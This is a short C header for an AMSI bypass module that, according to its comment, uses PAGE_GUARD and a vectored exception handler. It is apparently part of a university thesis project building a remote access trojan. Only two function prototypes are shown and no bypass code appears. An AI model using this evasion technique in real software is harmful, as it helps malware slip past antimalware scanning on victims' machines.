/* amsi_bypass.h — AMSI Bypass patchless via PAGE_GUARD + VEH
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA */
#ifndef AMSI_BYPASS_H
#define AMSI_BYPASS_H
#include <windows.h>
DWORD patch_amsi(void);
DWORD restore_amsi(void);
#endif
